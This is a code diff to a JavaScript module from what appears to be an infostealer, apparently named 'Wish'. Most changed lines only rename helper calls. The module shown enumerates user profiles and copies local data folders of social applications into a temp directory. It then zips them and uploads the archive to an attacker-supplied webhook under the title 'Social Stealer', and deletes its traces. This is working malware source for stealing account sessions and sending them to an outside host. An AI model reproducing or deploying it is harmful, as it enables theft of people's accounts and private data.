@@ -9,17 +9,17 @@ const fileutil = require('./../../utils/fileutil/fileutil.js');
 const hardware = require('./../../utils/hardware/hardware.js');
 
 module.exports = async (webhookUrl) => {
-    const users = await hardware.getUsers();
+    const users = await hardware.GetUsers();
 
     const socialsTempDir = path.join(os.tmpdir(), 'socials-temp');
     if (!fs.existsSync(socialsTempDir)) {
         fs.mkdirSync(socialsTempDir, { recursive: true });
-    };
+    }
 
     let socialsFound = '';
 
     for (const user of users) {
-        for (const [name, relativePath] of Object.entries(socialsPaths.getSocials())) {
+        for (const [name, relativePath] of Object.entries(socialsPaths.GetSocials())) {
             const socialsPath = path.join(user, relativePath);
 
             if (!fs.existsSync(socialsPath) || !fs.lstatSync(socialsPath).isDirectory()) {
@@ -28,7 +28,7 @@ module.exports = async (webhookUrl) => {
 
             try {
                 const socialsDestPath = path.join(socialsTempDir, user.split(path.sep)[2], name);
-                await fileutil.copy(socialsPath, socialsDestPath);
+                await fileutil.Copy(socialsPath, socialsDestPath);
                 socialsFound += `\n✅ ${user.split(path.sep)[2]} - ${name}`;
             } catch (err) {
                 continue;
@@ -46,12 +46,12 @@ module.exports = async (webhookUrl) => {
 
     const socialsTempZip = path.join(os.tmpdir(), 'socials.zip');
     try {
-        await fileutil.zipDirectory({
+        await fileutil.ZipDirectory({
             inputDir: socialsTempDir,
             outputZip: socialsTempZip
         });
 
-        await requests.webhook(webhookUrl, {
+        await requests.Webhook(webhookUrl, {
             embeds: [{
                 title: 'Social Stealer',
                 description: '```' + socialsFound + '```',
@@ -59,10 +59,10 @@ module.exports = async (webhookUrl) => {
         }, [socialsTempZip]);
 
         const WishTempDir = fileutil.WishTempDir('socials');
-        await fileutil.copy(socialsTempDir, WishTempDir);
+        await fileutil.Copy(socialsTempDir, WishTempDir);
         
         [socialsTempDir, socialsTempZip].forEach(async dir => {
-            await fileutil.removeDir(dir);
+            await fileutil.RemoveDir(dir);
         });
     } catch (error) {
         console.error(error);
